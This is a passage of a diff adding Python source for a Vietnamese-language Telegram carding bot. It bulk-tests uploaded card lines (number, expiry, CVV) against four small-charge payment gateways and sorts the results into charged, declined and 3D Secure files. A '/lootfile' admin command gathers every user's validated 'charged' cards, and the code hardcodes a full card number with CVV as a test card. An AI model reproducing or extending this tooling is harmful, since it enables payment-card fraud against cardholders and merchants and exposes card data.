+                                    f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
+                                    f"❔ **Errors:** `{counts['error']}`")
+                    try: 
+                        await status_message.edit_text(text=status_text)
+                    except telegram.error.BadRequest as e:
+                        if "Message is not modified" not in str(e): logger.warning(f"Lỗi khi cập nhật tiến trình /mass: {e}")
+                        pass
+                    except Exception as e:
+                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /mass: {e}")
+                    last_update_time = time.time()
+                
+        duration = time.time() - start_time
+
+        if cancel_event.is_set():
+            await status_message.edit_text(f"🛑 **Tác vụ đã được dừng theo yêu cầu.**\n\nĐã xử lý: {processed_count}/{total_lines} thẻ. Kết quả đã xử lý sẽ được gửi đi.")
+        
+        final_summary_text = (
+            f"**📊 Check Complete!**\n\n"
+            f"**Gate Used:** `{gate_name}`\n"
+            f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n\n"
+            f"✅ **Charged:** `{counts['success']}`\n"
+            f"❌ **Declined:** `{counts['decline']}`\n"
+            f"🔒 **3D Secure:** `{counts['custom']}`\n"
+            f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
+            f"❔ **Errors:** `{counts['error']}`\n"
+            f"🛑 **Cancelled:** `{counts['cancelled']}`\n\n"
+            f"**⏱️ Took:** `{duration:.2f}s`"
+        )
+        
+        await status_message.edit_text(final_summary_text)
+
+        summary_data = {'counts': counts, 'original_filename': document.file_name}
+        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
+        
+        update_user_stats(user.id, user, counts)
+
+        file_map = {
+            'success': 'charged.txt', 'decline': 'declined.txt',
+            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
+            'error': 'errors.txt', 'unknown': 'unknown.txt'
+        }
+        for status, filename in file_map.items():
+            if result_lists[status]:
+                file_path = os.path.join(session_dir, filename)
+                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
+                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)
+
+        if user.id == ADMIN_ID and result_lists['error_debug']:
+            debug_path = os.path.join(session_dir, "debug_admin.txt")
+            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
+            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)
+
+    except Exception as e:
+        logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
+        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{str(e).replace('`', '')}\n```")
+    finally:
+        ACTIVE_CHECKS.discard(user.id)
+        CANCELLATION_EVENTS.pop(user.id, None)
+
+# --- LỆNH DỪNG TASK ---
+async def stop_command(update, context):
+    user = update.effective_user
+    target_user_id = user.id
+
+    if user.id == ADMIN_ID and context.args:
+        try: target_user_id = int(context.args[0])
+        except (ValueError, IndexError):
+            await update.message.reply_text("❌ User ID không hợp lệ. Cú pháp: `/stop <user_id>`"); return
+    elif user.id != ADMIN_ID and user.id not in load_users():
+       await update.message.reply_text("Bạn không có quyền dùng lệnh này."); return
+
+    if target_user_id in CANCELLATION_EVENTS:
+        CANCELLATION_EVENTS[target_user_id].set()
+        if target_user_id == user.id:
+            await update.message.reply_text("⏳ Đã gửi yêu cầu dừng. Tác vụ sẽ dừng lại sau khi hoàn thành các thẻ đang check...")
+        else:
+            await update.message.reply_text(f"⏳ Đã gửi yêu cầu dừng tác vụ của người dùng `{target_user_id}`.")
+    else:
+        if target_user_id == user.id:
+            await update.message.reply_text("ℹ️ Bạn không có tác vụ /mass hoặc /multi nào đang chạy.")
+        else:
+            await update.message.reply_text(f"ℹ️ Người dùng `{target_user_id}` không có tác vụ nào đang chạy.")
+
+
+# --- CÁC LỆNH QUẢN LÝ & THÔNG BÁO ---
+
+def _perform_gate_check(gate_id: str, card_line: str):
+    """Hàm helper để kiểm tra một cổng cụ thể, trả về (trạng thái, phản hồi)"""
+    cc, mes, ano, cvv = card_line.split('|')
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    session = requests.Session()
+    session.headers.update({"User-Agent": ua})
+    
+    # Sử dụng logic của hàm check_card nhưng rút gọn cho việc test
+    try:
+        # Giả lập bin_info trống vì không cần check BIN cho lệnh status
+        bin_info = {} 
+
+        if gate_id == '1':
+            _, _, response_text, _ = _check_card_gate1(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
+        elif gate_id == '2':
+            _, _, response_text, _ = _check_card_gate2(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
+        elif gate_id == '3':
+            _, _, response_text, _ = _check_card_gate3(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
+        elif gate_id == '4':
+            _, _, response_text, _ = _check_card_gate4(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
+        else:
+            return "Không xác định ❓", "Gate ID không tồn tại"
+
+        # Phân tích kết quả
+        if '{"message":"Forbidden"}' in response_text:
+            return "Không hoạt động 🔴", response_text
+        elif '"payment_status":"failed"' in response_text:
+            return "Hoạt động 🟢", response_text
+        else:
+            # Bất kỳ phản hồi nào khác từ server đều có nghĩa là nó online
+            return "Hoạt động 🟢", response_text
+
+    except Exception as e:
+        logger.error(f"Lỗi khi kiểm tra trạng thái Gate {gate_id}: {e}")
+        return "Không hoạt động 🔴", str(e)
+
+
+async def status_command(update, context):
+    """Kiểm tra trạng thái hoạt động của các cổng thanh toán."""
+    if update.effective_user.id != ADMIN_ID: return
+    
+    msg = await update.message.reply_text("⏳ Đang kiểm tra trạng thái các cổng... Vui lòng chờ.")
+    
+    test_card = "4258818143133540|02|26|471" # Một thẻ test chung
+
+    # Chạy kiểm tra cho từng cổng trong các luồng riêng biệt
+    status1, response1 = await asyncio.to_thread(_perform_gate_check, '1', test_card)
+    status2, response2 = await asyncio.to_thread(_perform_gate_check, '2', test_card)
+    status3, response3 = await asyncio.to_thread(_perform_gate_check, '3', test_card)
+    status4, response4 = await asyncio.to_thread(_perform_gate_check, '4', test_card)
+
+
+    # Cắt bớt response nếu quá dài để hiển thị đẹp hơn
+    response1_display = response1[:1000]
+    response2_display = response2[:1000]
+    response3_display = response3[:1000]
+    response4_display = response4[:1000]
+
+    final_message = (
+        f"**📊 TRẠNG THÁI CỔNG THANH TOÁN 📊**\n\n"
+        f"----------------------------------------\n"
+        f"**Cổng 1: Charge 0.5**\n"
+        f"**Trạng thái:** {status1}\n"
+        f"**Phản hồi từ Server:**\n```\n{response1_display}\n```\n"
+        f"----------------------------------------\n"
+        f"**Cổng 2: Charge 0.5 V2**\n"
+        f"**Trạng thái:** {status2}\n"
+        f"**Phản hồi từ Server:**\n```\n{response2_display}\n```\n"
+        f"----------------------------------------\n"
+        f"**Cổng 3: Charge 0.5 V3**\n"
+        f"**Trạng thái:** {status3}\n"
+        f"**Phản hồi từ Server:**\n```\n{response3_display}\n```\n"
+        f"----------------------------------------\n"
+        f"**Cổng 4: Charge 0.5 V4**\n"
+        f"**Trạng thái:** {status4}\n"
+        f"**Phản hồi từ Server:**\n```\n{response4_display}\n```\n"
+        f"----------------------------------------"
+    )
+
+    await msg.edit_text(final_message)
+
+
+async def gate_command(update, context):
+    """Lệnh thay đổi cổng check (chỉ dành cho Admin)."""
+    if update.effective_user.id != ADMIN_ID: return
+    
+    gate_names = { '1': "Charge 0.5 (Gate 1)", '2': "Charge 0.5 V2 (Gate 2)", '3': "Charge 0.5 V3 (Gate 3)", '4': "Charge 0.5 V4 (Gate 4)" }
+    
+    if not context.args:
+        current_gate = get_active_gate()
+        await update.message.reply_text(f"ℹ️ Gate đang hoạt động: **{gate_names.get(current_gate, 'Không xác định')}**.\n\nDùng `/gate [1|2|3|4]` để thay đổi.")
+        return
+        
+    new_gate = context.args[0]
+    if new_gate in ['1', '2', '3', '4']:
+        set_active_gate(new_gate)
+        await update.message.reply_text(f"✅ Đã chuyển cổng thanh toán sang: **{gate_names[new_gate]}**")
+    else:
+        await update.message.reply_text("❌ Cổng không hợp lệ. Vui lòng chọn `1`, `2`, `3` hoặc `4`.")
+        
+async def turn_bot_off(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if not is_bot_on():
+        await update.message.reply_text("ℹ️ Bot đã ở trạng thái **Tắt** rồi."); return
+
+    set_bot_status(False)
+    await update.message.reply_text("✅ Đã **TẮT** bot. Bắt đầu gửi thông báo...")
+
+    authorized_users = load_users()
+    success_count, fail_count = 0, 0
+    for user_id in authorized_users:
+        if user_id == ADMIN_ID: continue
+        lang = get_user_lang(user_id) or 'en'
+        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
+        try:
+            await context.bot.send_message(chat_id=user_id, text=message)
+            success_count += 1
+        except Exception as e:
+            fail_count += 1
+            logger.warning(f"Không thể gửi thông báo tắt bot cho user {user_id}: {e}")
+        await asyncio.sleep(0.1) 
+    
+    await update.message.reply_text(f"📢 Thông báo bảo trì đã được gửi.\n- Thành công: {success_count}\n- Thất bại: {fail_count}")
+
+async def turn_bot_on(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if is_bot_on():
+        await update.message.reply_text("ℹ️ Bot đã ở trạng thái **Bật** rồi."); return
+    
+    set_bot_status(True)
+    await update.message.reply_text("✅ Đã **BẬT** bot. Bắt đầu gửi thông báo...")
+
+    authorized_users = load_users()
+    success_count, fail_count = 0, 0
+    for user_id in authorized_users:
+        if user_id == ADMIN_ID: continue
+        lang = get_user_lang(user_id) or 'en'
+        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
+        try:
+            await context.bot.send_message(chat_id=user_id, text=message)
+            success_count += 1
+        except Exception as e:
+            fail_count += 1
+            logger.warning(f"Không thể gửi thông báo bật bot cho user {user_id}: {e}")
+        await asyncio.sleep(0.1)
+
+    await update.message.reply_text(f"📢 Thông báo hoạt động đã được gửi.\n- Thành công: {success_count}\n- Thất bại: {fail_count}")
+
+async def send_message_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    
+    if len(context.args) < 2:
+        await update.message.reply_text("Cú pháp: `/send <user_id> <tin_nhắn>`"); return
+        
+    try: target_user_id = int(context.args[0])
+    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ."); return
+        
+    message_to_send = " ".join(context.args[1:])
+    
+    try:
+        await context.bot.send_message(chat_id=target_user_id, text=f"✉️ **Tin nhắn từ Admin:**\n\n{message_to_send}")
+        await update.message.reply_text(f"✅ Tin nhắn đã được gửi đến user `{target_user_id}`.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Gửi tin nhắn thất bại: `{e}`")
+
+async def send_all_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    
+    if not context.args:
+        await update.message.reply_text("Cú pháp: `/sendall <tin_nhắn>`"); return
+        
+    message_to_send = " ".join(context.args)
+    authorized_users = load_users()
+    
+    if not authorized_users:
+        await update.message.reply_text("ℹ️ Không có thành viên nào để gửi tin."); return
+        
+    await update.message.reply_text(f"📢 Bắt đầu gửi tin nhắn đến `{len(authorized_users)}` thành viên...")
+    
+    success_count, fail_count = 0, 0
+    for user_id in authorized_users:
+        if user_id == ADMIN_ID: continue
+        try:
+            await context.bot.send_message(chat_id=user_id, text=f"📢 **Thông báo từ Admin:**\n\n{message_to_send}")
+            success_count += 1
+        except Exception as e:
+            fail_count += 1
+            logger.warning(f"Không thể gửi broadcast đến user {user_id}: {e}")
+        await asyncio.sleep(0.1)
+        
+    await update.message.reply_text(f"🏁 Gửi tin nhắn hoàn tất!\n- Thành công: `{success_count}`\n- Thất bại: `{fail_count}`")
+
+async def show_check_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    stats = load_json_file(STATS_FILE)
+    if not stats:
+        await update.message.reply_text("Chưa có dữ liệu thống kê nào."); return
+    
+    message = "📊 **THỐNG KÊ CHECK CỦA USER** 📊\n\n"
+    all_users_to_show = load_users(); all_users_to_show.add(ADMIN_ID)
+
+    for user_id in sorted(list(all_users_to_show)):
+        user_id_str = str(user_id)
+        data = stats.get(user_id_str)
+        if isinstance(data, dict):
+            username = data.get('username')
+            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
+            message += (f"👤 **{user_display}** (`{user_id_str}`)\n"
+                        f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
+                        f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
+                        f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
+                        f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
+                        f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa check')}`\n"
+                        f"--------------------\n")
+        else:
+            message += (f"👤 **ID: {user_id_str}**\n"
+                        f"  *Chưa từng check hoặc dữ liệu lỗi.*\n"
+                        f"--------------------\n")
+    
+    if len(message) > 4096:
+        with io.BytesIO(message.encode('utf-8')) as doc:
+            await update.message.reply_document(document=doc, filename="stats.txt")
+    else:
+        await update.message.reply_text(message)
+
+
+async def loot_file_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if not context.args:
+        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`"); return
+    
+    target_user_id = context.args[0]
+    user_log_dir = os.path.join(LOG_DIR, target_user_id)
+    
+    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
+        await update.message.reply_text(f"Không tìm thấy lịch sử check cho user `{target_user_id}`."); return
+        
+    keyboard = [
+        [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
+        [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
+        [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(f"Chọn tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)
+
+async def button_handler(update, context):
+    query = update.callback_query
+    await query.answer()
+    
+    user_from_callback = query.from_user
+    data = query.data.split('_')
+    command = data[0]
+    
+    if command == "setlang":
+        lang_code = data[1]
+        set_user_lang(user_from_callback.id, lang_code)
+        help_text = await get_help_text(user_from_callback, lang_code)
+        await query.edit_message_text(help_text, disable_web_page_preview=True)
+        return
+
+    if user_from_callback.id != ADMIN_ID:
+        await query.answer("Bạn không có quyền thực hiện hành động này.", show_alert=True); return
+        
+    action = data[1]
+    target_user_id = data[2] if len(data) > 2 else None
+
+    if command == "loot":
+        if action == "mainmenu":
+            keyboard = [
+                [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
+                [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
+                [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(f"Chọn tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)
+
+        elif action == "latestcharge":
+            user_log_dir = os.path.join(LOG_DIR, target_user_id)
+            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
+                await query.edit_message_text(f"Không có lịch sử check cho user `{target_user_id}`."); return
+            
+            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
+            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
+            
+            if os.path.exists(file_path):
+                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
+                await query.edit_message_text(f"✅ Đã gửi file charge gần nhất từ session `{latest_session}`.")
+            else:
+                await query.edit_message_text(f"ℹ️ Lần check gần nhất (`{latest_session}`) không có thẻ charge nào.")
+
+        elif action == "allcharge":
+            user_log_dir = os.path.join(LOG_DIR, target_user_id)
+            all_charged_content = []
+            if os.path.exists(user_log_dir):
+                sessions = sorted(os.listdir(user_log_dir))
+                for session_ts in sessions:
+                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
+                    if os.path.exists(file_path):
+                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
+            
+            if all_charged_content:
+                combined_content = "\n".join(all_charged_content)
+                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
+                    filename = f"all_charged_{target_user_id}.txt"
+                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
+                await query.edit_message_text(f"✅ Đã gửi file tổng hợp tất cả thẻ charge của user `{target_user_id}`.")
+            else:
+                await query.edit_message_text(f"ℹ️ User `{target_user_id}` không có thẻ charge nào trong lịch sử.")
+
+        elif action == "history":
+            user_log_dir = os.path.join(LOG_DIR, target_user_id)
+            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
+            keyboard = []
+            for session_ts in sessions:
+                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
+                if os.path.exists(summary_path):
+                    summary = load_json_file(summary_path)
+                    counts = summary.get('counts', {})
+                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
+                    except ValueError: readable_ts = session_ts
+                    button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
+                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
+            
+            keyboard.append([InlineKeyboardButton("« Quay lại Menu Chính", callback_data=f"loot_mainmenu_{target_user_id}")])
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(f"📜 **Lịch sử check của user `{target_user_id}`:**", reply_markup=reply_markup)
+
+        elif action == "session":
+            _, _, target_user_id, session_ts = data
+            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
+            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
+            if not files:
+                await query.edit_message_text("Session này không có file kết quả nào."); return
+            keyboard = []
+            for filename in files:
+                keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
+            keyboard.append([InlineKeyboardButton("« Quay lại Lịch Sử", callback_data=f"loot_history_{target_user_id}")])
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(f"Chọn file để tải từ session `{session_ts}`:", reply_markup=reply_markup)
+
+        elif action == "getfile":
+            _, _, target_user_id, session_ts, filename = data
+            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
+            if os.path.exists(file_path):
+                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
+                await query.answer(f"Đã gửi file {filename}")
+            else:
+                await query.answer("❌ Lỗi: Không tìm thấy file.", show_alert=True)
+
+def main():
+    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
+    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()
+
+    # Lệnh chung
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("info", info))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("stop", stop_command))
+    
+    # Lệnh Admin
+    application.add_handler(CommandHandler("add", add_user))
+    application.add_handler(CommandHandler("ban", ban_user))
+    application.add_handler(CommandHandler("show", show_users))
+    application.add_handler(CommandHandler("addlimit", add_limit_command))
+    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
+    application.add_handler(CommandHandler("showcheck", show_check_command))
+    application.add_handler(CommandHandler("lootfile", loot_file_command))
+    application.add_handler(CommandHandler("status", status_command))
+    application.add_handler(CommandHandler("gate", gate_command))
+    application.add_handler(CommandHandler("on", turn_bot_on))
+    application.add_handler(CommandHandler("off", turn_bot_off))
+    application.add_handler(CommandHandler("send", send_message_command))
+    application.add_handler(CommandHandler("sendall", send_all_command))
+    
+    # Lệnh Check
+    application.add_handler(CommandHandler("cs", cs_command))
+    application.add_handler(CommandHandler("bin", bin_command))
+    application.add_handler(CommandHandler("multi", multi_check_command))
+    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
+    
+    # Xử lý nút bấm
+    application.add_handler(CallbackQueryHandler(button_handler))
+    
+    logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
